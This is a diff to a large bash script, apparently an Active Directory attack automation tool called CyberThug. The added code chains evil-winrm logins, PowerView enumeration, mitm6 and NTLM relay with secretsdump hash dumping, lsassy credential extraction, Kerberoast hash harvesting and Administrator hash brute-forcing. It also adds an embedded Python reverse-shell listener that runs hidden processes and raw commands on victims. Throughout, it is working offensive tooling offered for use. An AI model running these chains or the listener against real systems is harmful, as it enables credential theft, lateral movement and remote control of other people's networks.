@@ -1867,6 +2250,96 @@ echo -e '
 |_| \_/_/\_\____|
 
 \e[0m'
+gnome-terminal -- bash -c '
+echo ''
+read -p \"Press Enter to run Evil-Winrm for User => $User\"
+echo '' 
+evil-winrm -i $DOMAIN -u $User -p $Password
+echo ''
+getTGT.py $CLEAN_DOMAIN/$User:$Password -dc-ip $Ip -k
+echo ''
+export KRB5CCNAME=$User.ccache
+echo ''
+evil-winrm -i $DC -u $User -r $CLEAN_DOMAIN
+exec bash '
+
+gnome-terminal -- bash -c '
+echo '' 
+read -p \"Press Enter to run Powerview for User => $User\"
+echo ''   
+expect -c \"
+set timeout -1
+set send_slow {1 .001}
+spawn powerview $CLEAN_DOMAIN/$User:$Password@$DC 
+expect -re {PV.*❯};
+send -s \\\"Get-Domain\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainUser\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainUser -Properties Samaccountname,memberof,description\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainUser -spn\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainUser -spn -Properties servicePrincipalName\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainUser -PreAuthNotRequired\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainGroup\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainGroup -Properties name,member\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainGroup -Identity \\\\\\\"Domain Admins\\\\\\\"\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainGroupMember -Identity \\\\\\\"Domain Admins\\\\\\\"\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainGroup -AdminCount\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainTrust\\r\\\";
+interact\"
+echo ''
+getTGT.py $CLEAN_DOMAIN/$User:$Password -dc-ip $Ip -k
+echo ''
+export KRB5CCNAME=$User.ccache
+echo ''
+expect -c \"
+set timeout -1
+set send_slow {1 .001}
+spawn powerview $CLEAN_DOMAIN/$User:$Password@$DC -k
+expect -re {PV.*❯};
+send -s \\\"Get-Domain\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainUser\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainUser -Properties Samaccountname,memberof,description\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainUser -spn\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainUser -spn -Properties servicePrincipalName\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainUser -PreAuthNotRequired\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainGroup\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainGroup -Properties name,member\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainGroup -Identity \\\\\\\"Domain Admins\\\\\\\"\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainGroupMember -Identity \\\\\\\"Domain Admins\\\\\\\"\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainGroup -AdminCount\\r\\\";
+expect -re {PV.*❯};
+send -s \\\"Get-DomainTrust\\r\\\";
+interact\"
+exec bash'
+echo ""
 echo -e '\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M lsassy $flag --[+]\033[0m'
 nxc smb $DOMAIN -u $User -p $Password -M lsassy $flag 
 echo ''
@@ -1942,12 +2415,24 @@ echo ''
 echo -e '\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password --gmsa $flag --[+]\033[0m'
 nxc ldap $DOMAIN -u $User -p $Password --gmsa $flag
 echo ''
+echo -e '\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password --trusted-for-delegation $flag --[+]\033[0m'
+nxc ldap $DOMAIN -u $User -p $Password --trusted-for-delegation $flag
+echo '' 
+echo -e '\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password -M ldap-checker $flag --[+]\033[0m'
+nxc ldap $DOMAIN -u $User -p $Password -M ldap-checker $flag 
+echo ''
 echo -e '\033[36m[+]-- Running nxc mssql $DOMAIN --local-auth -u $User -p $Password -x \"net user\" $flag --[+]\033[0m'
 nxc mssql $DOMAIN --local-auth -u $User -p $Password -x \"net user\" $flag
 echo '' 
 exec bash
 "
-            echo ""
+gnome-terminal -- bash -c "
+echo -e '\033[36m[+]-- BruteForcing Administrator Hash --[+]\033[0m' 
+echo ''
+nxc smb $DOMAIN -u Administrator -H /usr/share/wordlists/hashes
+exec bash  
+"
+echo ""
 ntlmrelay_mitm6(){
 gnome-terminal -- bash -c "
 echo -e '\033[36m[+]-- Running Mitm6 Attack --[+]\033[0m'
@@ -2004,7 +2489,7 @@ fi
 
 rand=\$((RANDOM))
 
-impacket-ntlmrelayx -6 -wh internal-\$rand.'"$DOMAIN"' -t \$ch1://$DC -l mitm6_loot_'"$DOMAIN"'_'"$DATE"' --no-smb-server --add-computer --dump-hashes \$esc_user 2>&1 | \\
+ntlmrelayx.py -6 -wh internal-\$rand.'"$DOMAIN"' -t \$ch1://$DC -l mitm6_loot_'"$DOMAIN"'_'"$DATE"' --no-smb-server --add-computer --dump-hashes \$esc_user 2>&1 | \\
 while IFS= read -r line; do
     echo \"\$line\"
 
@@ -2017,7 +2502,7 @@ while IFS= read -r line; do
         if [ -z \"\$ip_c\" ]; then
 	   echo \" ** Add \$c_computer to /etc/hosts \"	
 	else        
-           gnome-terminal -- bash -c \"impacket-secretsdump \$esc_computer/\$esc_user_name:\$P@\$ip_c ; exec bash\"
+           gnome-terminal -- bash -c \"secretsdump.py \$esc_computer/\$esc_user_name:\$P@\$ip_c ; secretsdump.py \$esc_computer/\$esc_user_name:\$P@\$ip_c > /tmp/secretsdump_-t_'\"$DATE\"'_\$esc_computer ; cp /tmp/secretsdump_-t_'\"$DATE\"'_\$esc_computer $HOME/CyberThug_output/cyberthug_-t_output/'\"$DOMAIN\"' ; exec bash\"
         fi
     fi
 done
@@ -2075,7 +2560,7 @@ if [[ "$signing_status" == "False" || "$signing_status" == "false" ]]; then
     expect << EOD
       log_user 1
       sleep 8
-      spawn impacket-ntlmrelayx -tf /tmp/targets.txt -of SAMhashes -smb2support -socks --keep-relaying --no-http-server  --no-wcf-server --no-raw-server
+      spawn ntlmrelayx.py -tf /tmp/targets.txt -of SAMhashes -smb2support -socks --keep-relaying --no-http-server  --no-wcf-server --no-raw-server
       set targets {}
       expect {
          eof { exit }
@@ -2090,9 +2575,9 @@ if [[ "$signing_status" == "False" || "$signing_status" == "false" ]]; then
             set Username \$expect_out(2,string)
             if {[lsearch \$targets \$Username] == -1} {
                 lappend targets \$Username 
-                exec gnome-terminal -- bash -c "sleep 2 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; cp SAMhashes_ntlmv2 $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/SAMhashes_smbrelay_ntlmv2_$DATE 2>/dev/null ; cp SAMhashes_ntlm $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/SAMhashes_smbrelay_ntlm_$DATE 2>/dev/null ; sleep 2 ; proxychains -q impacket-smbexec -no-pass \$Username@$target -debug ; exec bash"
-                exec gnome-terminal -- bash -c "sleep 5 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; proxychains -q impacket-secretsdump -no-pass \$Username@$target -debug ; exec bash" 
-		exec gnome-terminal -- bash -c "sleep 2 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; proxychains -q impacket-smbclient -no-pass \$Username@$target ; exec bash"
+                exec gnome-terminal -- bash -c "sleep 2 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; cp SAMhashes_ntlmv2 $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/SAMhashes_smbrelay_ntlmv2_$DATE 2>/dev/null ; cp SAMhashes_ntlm $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/SAMhashes_smbrelay_ntlm_$DATE 2>/dev/null ; sleep 2 ; proxychains -q smbexec.py -no-pass \$Username@$target -debug ; exec bash"
+                exec gnome-terminal -- bash -c "sleep 5 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; proxychains -q secretsdump.py -no-pass \$Username@$target -debug ; proxychains -q secretsdump.py -no-pass \$Username@$target > /tmp/secretsdump_-t_$DOMAIN ; cp /tmp/secretsdump_-t_$DOMAIN $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/secretsdump_-t_$DATE ; exec bash" 
+		exec gnome-terminal -- bash -c "sleep 2 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; proxychains -q smbclient.py -no-pass \$Username@$target ; exec bash"
             }    
             exp_continue
            }
@@ -2341,7 +2826,7 @@ exec bash
                sleep 0.1
             done
             echo ""
-	    nxc smb $DOMAIN -u $User -p $Password --shares $flag | awk '/READ/ {print $5}' > /tmp/shares.txt
+	    nxc smb $DOMAIN -u $User -p $Password --shares $flag | awk 'NR>6 && $0 ~ /READ/ {for(i=5;i<=NF && $i !~ /READ/; i++) printf "%s%s",$i,(i<NF?" ":"\n"); print ""}' > /tmp/shares.txt
             if [[ -s /tmp/shares.txt ]]; then
                 if [[ -f "$User" || -f "$Password" ]]; then
 		    :
@@ -2356,14 +2841,14 @@ exec bash
           	               echo -e '\033[36m[+] User: $User\033[0m'
                    	       echo -e '\033[36m[+] Password: $Password\033[0m'
                                echo \"\"
-                    	       smbclient //$DC/\$share -U $User%$Password
+                    	       smbclient //$DC/'\$share' -U $User%$Password
                                echo \"\"
                     	       echo -e '\033[36m[+] Getting TGT for => $User\033[0m'
 			       echo \"\"
                     	       getTGT.py $CLEAN_DOMAIN/$User:$Password -dc-ip $DC -k 
                     	       export KRB5CCNAME=${User}.ccache
                                echo \"\"
-                    	       impacket-smbclient -k -no-pass -target-ip $Ip $CLEAN_DOMAIN/$User@$DC
+                    	       smbclient.py -k -no-pass -target-ip $Ip $CLEAN_DOMAIN/$User@$DC
                     	       exec bash
                 	    \"
                         done < /tmp/shares.txt
@@ -2372,6 +2857,10 @@ exec bash
                 fi
             fi
             echo ""
+            echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M spider_plus $flag --[+]\033[0m"
+            echo ""
+            nxc smb $DOMAIN -u $User -p $Password -M spider_plus $flag 
+            echo "" 
             echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password --loggedon-users $flag --[+]\033[0m"
             echo ""
             nxc smb $DOMAIN -u $User -p $Password --loggedon-users $flag
@@ -2437,6 +2926,20 @@ exec bash
             echo -e "\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password --bloodhound --collection all --dns-server $Ip $flag --[+]\033[0m"
             echo ""
             nxc ldap $DOMAIN -u $User -p $Password --bloodhound --collection all --dns-server $Ip $flag
+            echo ""
+            if [[ -f "$User" && -f "$Password" ]]; then
+                 :
+            elif [[ -f "$User" ]]; then
+                 :
+            elif [[ -f "$Password" ]] ; then
+                 :
+            else
+                 echo -e "\033[36m[+]-- Running findDelegation.py $DOMAIN/$User:$Password -target-domain $DOMAIN $flag --[+]\033[0m"
+            	 findDelegation.py $DOMAIN/$User:$Password -target-domain $DOMAIN $flag	
+                 echo "----------"
+                 echo -e "\033[36m[+]-- Running findDelegation.py $CLEAN_DOMAIN/$User:$Password -target-domain $CLEAN_DOMAIN -dc-host $DC $flag --[+]\033[0m"
+		 findDelegation.py $CLEAN_DOMAIN/$User:$Password -target-domain $CLEAN_DOMAIN -dc-host $DC $flag
+            fi  
             echo ""
             if [[ -f "$User" && -f "$Password" ]]; then
                 if [[ $(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then
@@ -2607,6 +3110,13 @@ exec bash
                       targeted_kerberoast_check
                 fi            
             fi  
+            echo -e "\033[36m[+]-- Running mssqlclient.py -windows-auth $CLEAN_DOMAIN/$User:$Password@$Ip --[+]\033[0m"
+            echo ""
+            timeout 5 mssqlclient.py -windows-auth $CLEAN_DOMAIN/$User:$Password@$Ip > /tmp/mssql.txt
+            if [[ $(wc -l < /tmp/mssql.txt) -gt 5 ]]; then
+                gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- Running mssqlclient.py on $CLEAN_DOMAIN --[+]\e[0m' ; echo '' ; mssqlclient.py -windows-auth $CLEAN_DOMAIN/$User:$Password@$Ip ; exec bash"
+            fi  
+            echo ""
             if [[ $(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then
                 if [[ -f "$User" && -f "$Password" ]]; then
                       echo "" 
@@ -2631,7 +3141,15 @@ exec bash
                           while read -r p; do
                               echo ""
                     	      echo -e "\033[36m$u\033[0m" 
-                              GetUserSPNs.py "$CLEAN_DOMAIN/$u:$p" -request $dc_host $flag 2>/dev/null
+                              GetUserSPNs.py "$CLEAN_DOMAIN/$u:$p" -request $dc_host $flag 2>/dev/null | grep '^\$krb5tgs\$' >> /tmp/.getuserspn-req.txt.$u
+                              if [[ -s /tmp/.getuserspn-req.txt.$u ]]; then
+                                 cp /tmp/.getuserspn-req.txt.$u /tmp/.getuserspn-req1.txt.$u
+                                 echo "$u" > /tmp/.current_ii.txt
+                                 getuserspns1_check
+                                 cat /tmp/.getuserspn-req1.txt.$u
+                                 cp /tmp/.getuserspn-req1.txt.$u $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn-req1_tgs_$DOMAIN_$DATE 2>/dev/null
+                                 rm /tmp/.getuserspn-req1.txt.$u 2>/dev/null 
+                              fi
                           done < $Password
                       done < /tmp/.test1_nxc_rid_brute
                       echo ""
@@ -2671,7 +3189,15 @@ exec bash
                       while read -r u; do
                           echo ""
                           echo -e "\033[36m$u\033[0m" 
-                          GetUserSPNs.py $CLEAN_DOMAIN/$u:$Password -request $dc_host $flag 2>/dev/null
+                          GetUserSPNs.py $CLEAN_DOMAIN/$u:$Password -request $dc_host $flag | grep '^\$krb5tgs\$' >> /tmp/.getuserspn-req.txt.$u
+                          if [[ -s /tmp/.getuserspn-req.txt.$u ]]; then
+                             cp /tmp/.getuserspn-req.txt.$u /tmp/.getuserspn-req1.txt.$u
+                             echo "$u" > /tmp/.current_ii.txt
+                             getuserspns1_check
+                             cat /tmp/.getuserspn-req1.txt.$u
+                             cp /tmp/.getuserspn-req1.txt.$u $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn-req1_tgs_$DOMAIN_$DATE 2>/dev/null
+                             rm /tmp/.getuserspn-req1.txt.$u 2>/dev/null 
+                          fi
                       done < /tmp/.test1_nxc_rid_brute
                       echo ""
                       echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth /tmp/.test1_nxc_rid_brute -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ --[+]\033[0m"
@@ -2710,7 +3236,15 @@ exec bash
                           while read -r p; do
                                echo ""
                                echo -e "\033[36m$User\033[0m" 
-                               GetUserSPNs.py $CLEAN_DOMAIN/$User:$p -request $dc_host $flag 2>/dev/null
+                               GetUserSPNs.py $CLEAN_DOMAIN/$User:$p -request $dc_host $flag | grep '^\$krb5tgs\$' >> /tmp/.getuserspn-req.txt.$User
+                               if [[ -s /tmp/.getuserspn-req.txt.$User ]]; then
+                                 cp /tmp/.getuserspn-req.txt.$User /tmp/.getuserspn-req1.txt.$User
+                                 echo "$User" > /tmp/.current_ii.txt
+                                 getuserspns1_check
+                                 cat /tmp/.getuserspn-req1.txt.$User
+                                 cp /tmp/.getuserspn-req1.txt.$User $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn-req1_tgs_$DOMAIN_$DATE 2>/dev/null
+                                 rm /tmp/.getuserspn-req1.txt.$User 2>/dev/null 
+                               fi
                           done < $Password
                       echo ""
                       echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth /tmp/.test1_nxc_rid_brute -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ --[+]\033[0m"
@@ -2748,7 +3282,15 @@ exec bash
                       echo -e "\033[36m[+]-- Running GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag --[+]\033[0m"
                       echo ""
                       echo -e "\033[36m$User\033[0m" 
-                      GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag 2>/dev/null
+                      GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag | grep '^\$krb5tgs\$' >> /tmp/.getuserspn-req.txt.$User
+                      if [[ -s /tmp/.getuserspn-req.txt.$User ]]; then
+                           cp /tmp/.getuserspn-req.txt.$User /tmp/.getuserspn-req1.txt.$User
+                           echo "$User" > /tmp/.current_ii.txt
+                           getuserspns1_check
+                           cat /tmp/.getuserspn-req1.txt.$User
+                           cp /tmp/.getuserspn-req1.txt.$User $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn-req1_tgs_$DOMAIN_$DATE 2>/dev/null
+                           rm /tmp/.getuserspn-req1.txt.$User 2>/dev/null 
+                      fi
                       echo ""
                       echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth /tmp/.test1_nxc_rid_brute -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ --[+]\033[0m"
                       for i in $(cat /tmp/.test1_nxc_rid_brute); do
@@ -2773,7 +3315,15 @@ exec bash
                         while read -r p; do
                            echo ""
                            echo -e "\033[36m$u\033[0m" 
-                           GetUserSPNs.py $CLEAN_DOMAIN/$u:$p -request $dc_host $flag 2>/dev/null
+                           GetUserSPNs.py $CLEAN_DOMAIN/$u:$p -request $dc_host $flag | grep '^\$krb5tgs\$' >> /tmp/.getuserspn-req.txt.$u
+                           if [[ -s /tmp/.getuserspn-req.txt.$u ]]; then
+                               cp /tmp/.getuserspn-req.txt.$u /tmp/.getuserspn-req1.txt.$u
+                               echo "$u" > /tmp/.current_ii.txt
+                               getuserspns1_check
+                               cat /tmp/.getuserspn-req1.txt.$u
+                               cp /tmp/.getuserspn-req1.txt.$u $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn-req1_tgs_$DOMAIN_$DATE 2>/dev/null
+                               rm /tmp/.getuserspn-req1.txt.$u 2>/dev/null 
+                           fi
                         done < $Password
                     done < $User
                     echo ""
@@ -2827,6 +3377,21 @@ exec bash
                           getnpusers_check
                     fi
                     echo ""
+                    echo -e "\033[36m[+]-- Running GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag --[+]\033[0m"
+                    while read -r u; do
+                        echo ""
+                        echo -e "\033[36m$u\033[0m" 
+                        GetUserSPNs.py $CLEAN_DOMAIN/$u:$Password -request $dc_host $flag | grep '^\$krb5tgs\$' >> /tmp/.getuserspn-req.txt.$u
+                        if [[ -s /tmp/.getuserspn-req.txt.$u ]]; then
+                           cp /tmp/.getuserspn-req.txt.$u /tmp/.getuserspn-req1.txt.$u
+                           echo "$u" > /tmp/.current_ii.txt
+                           getuserspns1_check
+                           cat /tmp/.getuserspn-req1.txt.$u
+                           cp /tmp/.getuserspn-req1.txt.$u $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn-req1_tgs_$DOMAIN_$DATE 2>/dev/null
+                           rm /tmp/.getuserspn-req1.txt.$u 2>/dev/null 
+                        fi
+                    done < $User
+                    echo ""
                     echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth $User -usersfile $User -dc-host $DC $CLEAN_DOMAIN/ --[+]\033[0m"
                     for i in $(cat $User); do
                         echo ""
@@ -2847,14 +3412,30 @@ exec bash
                             while read -r p; do
                                 echo ""
                                 echo -e "\033[36m$User\033[0m" 
-                                GetUserSPNs.py $CLEAN_DOMAIN/$User:$p -request $dc_host $flag 2>/dev/null
+                                GetUserSPNs.py $CLEAN_DOMAIN/$User:$p -request $dc_host $flag 2>/dev/null | grep '^\$krb5tgs\$' >> /tmp/.getuserspn-req.txt.$User
+                                if [[ -s /tmp/.getuserspn-req.txt.$User ]]; then
+                                   cp /tmp/.getuserspn-req.txt.$User /tmp/.getuserspn-req1.txt.$User
+                                   echo "$User" > /tmp/.current_ii.txt
+                                   getuserspns1_check
+                                   cat /tmp/.getuserspn-req1.txt.$User
+                                   cp /tmp/.getuserspn-req1.txt.$User $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn-req1_tgs_$DOMAIN_$DATE 2>/dev/null
+                                   rm /tmp/.getuserspn-req1.txt.$User 2>/dev/null 
+                                fi
                             done < $Password
                         echo ""
                 else
                         echo -e "\033[36m[+]-- Running GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag --[+]\033[0m"
                         echo ""
                         echo -e "\033[36m$User\033[0m" 
-			GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag 2>/dev/null
+			GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag 2>/dev/null | grep '^\$krb5tgs\$' >> /tmp/.getuserspn-req.txt.$User
+                        if [[ -s /tmp/.getuserspn-req.txt.$User ]]; then
+                             cp /tmp/.getuserspn-req.txt.$User /tmp/.getuserspn-req1.txt.$User
+                             echo "$User" > /tmp/.current_ii.txt
+                             getuserspns1_check
+                             cat /tmp/.getuserspn-req1.txt.$User
+                             cp /tmp/.getuserspn-req1.txt.$User $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn-req1_tgs_$DOMAIN_$DATE 2>/dev/null
+                             rm /tmp/.getuserspn-req1.txt.$User 2>/dev/null 
+                        fi
                         echo ""
                 fi
             fi
@@ -3006,41 +3587,111 @@ EOF
                          cat > "$PYFILE" << 'EOF'
 import socket
 import signal
+import threading
 from prompt_toolkit.shortcuts import PromptSession
 from prompt_toolkit.history import FileHistory
 
 history_file = ".shell_history"
 session = PromptSession(history=FileHistory(history_file))
 
+current_shell = "unknown"
+
 def ignore_signal(signum, frame):
     pass
 
+def detect_shell(first_data: str) -> str:
+    """Try to detect if connected shell is PowerShell or CMD"""
+    if "powershell" in first_data.lower() or first_data.strip().startswith("PS "):
+        return "powershell"
+    return "cmd"
+
+def receiver(client_socket):
+    """ Continuously receive victim output asynchronously """
+    global current_shell
+    first_chunk = True
+    try:
+        while True:
+            data = client_socket.recv(4096)
+            if not data:
+                break
+            decoded = data.decode(errors="ignore")
+            if first_chunk:
+                current_shell = detect_shell(decoded)
+                print(f"\033[93m[*] Detected shell: {current_shell}\033[0m")
+                first_chunk = False
+            print(decoded, end="", flush=True)
+    except Exception:
+        pass
+
+def send_command_async(client_socket, cmd):
+    """Send a command asynchronously so the prompt stays usable."""
+    def worker():
+        try:
+            client_socket.send(cmd.encode() + b"\n")
+        except Exception as e:
+            print(f"[!] Error sending command: {e}")
+    threading.Thread(target=worker, daemon=True).start()
+
+def build_background_command(cmd):
+    """Wrap normal commands to run in background on victim."""
+    global current_shell
+    safe_cmd = cmd.replace('"', '`"')
+    if current_shell == "cmd":
+        return f'start /b cmd /c "{safe_cmd}"'
+    elif current_shell == "powershell":
+        return f'powershell -windowstyle hidden -c "{safe_cmd}"'
+    else:
+        return f'start /b cmd /c "{safe_cmd}"'
+
 def handle_client(client_socket, addr):
-    print(f"\033[92m[*] Connection from {addr[0]}:{addr[1]}\033[0m")
-    print("\033[96m[*] Alias: 'p <command>' or 'create_process <command>' runs the command as a hidden process.\033[0m")
+    global current_shell
+    print(f"\033[92m[*] Connection established from {addr[0]}:{addr[1]}\033[0m")
+    print("\033[96m[*] Available Aliases & Commands:\033[0m")
     print("")
+    print("   \033[93mp <command>\033[0m or \033[93mcreate_process <command>\033[0m → Run hidden process")
+    print("   \033[93mkill <process_name|pid>\033[0m → Terminate process by name or PID")
+    print("   \033[93mc <command>\033[0m → Run Raw Command")
+    print("   \033[93mshell cmd\033[0m → Switch manually to CMD mode")
+    print("   \033[93mshell ps\033[0m  → Switch manually to PowerShell mode")
+    print("   \033[93malias\033[0m → Show this list again\n")
+
+    threading.Thread(target=receiver, args=(client_socket,), daemon=True).start()
+
     try:
         while True:
             try:
-                cmd = session.prompt("Shell> ")
+                cmd = session.prompt(f"Shell({current_shell})> ")
             except KeyboardInterrupt:
                 print("")
                 continue
 
             if not cmd.strip():
                 continue
+
             if cmd.lower() == "exit":
                 print("[*] Exiting shell session.")
-                client_socket.send(cmd.encode() + b"\n")
+                send_command_async(client_socket, "exit")
                 client_socket.close()
                 break
 
-            if cmd.startswith("p ") or cmd.startswith("create_process "):
-                if cmd.startswith("p "):
-                    user_cmd = cmd[2:].strip()
-                else:
-                    user_cmd = cmd[len("create_process "):].strip()
+            if cmd.lower() in ["shell cmd", "cmd"]:
+                if current_shell == "powershell":
+                    print("[*] Switching from PowerShell to CMD...")
+                    send_command_async(client_socket, "cmd")  
+                current_shell = "cmd"
+                print("[*] Forced to cmd.exe mode")
+                continue
 
+            elif cmd.lower() in ["shell ps", "shell powershell" , "powershell"]:
+                if current_shell == "cmd":
+                    print("[*] Switching from CMD to PowerShell...")
+                    send_command_async(client_socket, "powershell")  
+                current_shell = "powershell"
+                print("[*] Forced to PowerShell mode")
+                continue
+
+            if cmd.startswith("p ") or cmd.startswith("create_process "):
+                user_cmd = cmd[2:].strip() if cmd.startswith("p ") else cmd[len("create_process "):].strip()
                 if not user_cmd:
                     print("No command provided after alias.")
                     continue
@@ -3048,31 +3699,59 @@ def handle_client(client_socket, addr):
                 parts = user_cmd.split()
                 executable = parts[0]
                 args = " ".join(parts[1:]) if len(parts) > 1 else ""
-
                 args_escaped = args.replace('"', '`"')
 
                 if args:
-                    send_cmd = f'powershell -windowstyle hidden -c "Start-Process -FilePath \'{executable}\' -ArgumentList \'{args_escaped}\' -WindowStyle Hidden"'
+                    send_cmd = (
+                        f'powershell -windowstyle hidden -c "Start-Process -FilePath \'{executable}\' '
+                        f'-ArgumentList \'{args_escaped}\' -WindowStyle Hidden"'
+                    )
                 else:
-                    send_cmd = f'powershell -windowstyle hidden -c "Start-Process -FilePath \'{executable}\' -WindowStyle Hidden"'
+                    send_cmd = (
+                        f'powershell -windowstyle hidden -c "Start-Process -FilePath \'{executable}\' '
+                        f'-WindowStyle Hidden"'
+                    )
 
-                print(f"Executing: {send_cmd}")
-                client_socket.send(send_cmd.encode() + b"\n")
-            else:
-                client_socket.send(cmd.encode() + b"\n")
+                print(f"Executing (isolated): {send_cmd}")
+                send_command_async(client_socket, send_cmd)
+                continue
 
-            response = b""
-            client_socket.settimeout(1.0)
-            try:
-                while True:
-                    chunk = client_socket.recv(4096)
-                    if not chunk:
-                        break
-                    response += chunk
-            except socket.timeout:
-                pass
+            elif cmd.startswith("kill "):
+                proc = cmd[5:].strip()
+                if not proc:
+                    print("Usage: kill <process_name|pid>")
+                    continue
+                if proc.isdigit():
+                    send_cmd = f"taskkill /PID {proc} /F"
+                else:
+                    if not proc.lower().endswith(".exe"):
+                        proc += ".exe"
+                    send_cmd = f"taskkill /IM {proc} /F"
 
-            print(response.decode(errors="ignore"))
+                print(f"Executing (isolated): {send_cmd}")
+                send_command_async(client_socket, send_cmd)
+                continue
+
+            elif cmd.startswith("c "):
+                raw_cmd = cmd[2:].strip()
+                if not raw_cmd:
+                    print("Usage: c <command>")
+                    continue
+                print(f"Executing (raw): {raw_cmd}")
+                send_command_async(client_socket, raw_cmd)
+                continue
+
+            elif cmd == "alias":
+                print("Available aliases:")
+                print("  p <command> or create_process <command> → Run hidden process")
+                print("  kill <process_name|pid> → Taskkill process by name or PID")
+                print("  c <command> → Run Raw Command")
+                print("  shell cmd → Switch manually to cmd.exe mode")
+                print("  shell ps  → Switch manually to PowerShell mode")
+                continue
+
+            send_cmd = build_background_command(cmd)
+            send_command_async(client_socket, send_cmd)
 
     except (ConnectionResetError, BrokenPipeError):
         print("[*] Connection lost. Waiting for new connection...")
@@ -3296,7 +3975,7 @@ EOF
                     1) smbclient -L domain
                     2) smbclient -L domain -U user%password
                     3) smbclient \\\\\\\\domain\\\\share -U user%password
-                    4) impacket-smbclient -k -no-pass -target-ip dc domain/user@dc
+                    4) smbclient.py -k -no-pass -target-ip dc domain/user@dc
                "
                read_input number $'\033[35m# \033[0m'
                if [[ "$number" == ".." ]]; then
@@ -3343,9 +4022,9 @@ EOF
  	          echo -e "\e[1;32m[*] Export KRB5CCNAME=$User.ccache ... \e[0m"
                   echo "" 
  		  export KRB5CCNAME=$User.ccache
-                  echo -e "\033[36m[+]-- Running impacket-smbclient -k -no-pass -target-ip $DC $Domain/$User@$DC --[+]\033[0m"
+                  echo -e "\033[36m[+]-- Running smbclient.py -k -no-pass -target-ip $DC $Domain/$User@$DC --[+]\033[0m"
 	          echo ""
-                  impacket-smbclient -k -no-pass -target-ip $DC $Domain/$User@$DC
+                  smbclient.py -k -no-pass -target-ip $DC $Domain/$User@$DC
                   echo "" 
                elif [[ "$number" == "exit" ]]; then
                     exit 0
@@ -3369,49 +4048,52 @@ EOF
           	  2) nxc smb domain -u 'user' -p 'password' --users
                   3) nxc smb domain -u 'user' -p 'password' --rid-brute
                   4) nxc smb domain -u 'user' -p 'password' --shares
-                  5) nxc smb domain -u 'user' -p 'password' --loggedon-users
-                  6) nxc smb domain -u 'user' -p 'password' -M enum_av
